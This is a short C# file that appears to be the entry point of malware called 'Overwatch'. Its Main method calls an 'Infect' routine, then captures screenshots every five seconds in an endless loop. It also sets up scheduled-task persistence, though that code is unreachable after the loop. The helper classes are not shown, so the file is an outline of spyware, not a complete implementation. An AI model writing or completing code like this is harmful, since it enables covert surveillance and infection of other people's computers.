using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Diagnostics;

namespace Overwatch
{
    class cMain
    {
        static appLog Log = new appLog();
        
        static void Main(string[] args)
        {
            try
            {
                cStartupOptions.ProcessStartInfo();
                cChangeLabel.Infect(args);
                while (true)
                {
                    cReceiveInformation.ScreenShoot();
                    System.Threading.Thread.Sleep(5000);
                }
                cInstallTaskScheduler i = new cInstallTaskScheduler();
                i.Task();
            }
            catch (Exception ex){ Log.Write(ex.Message, true);}
        }
    }
}
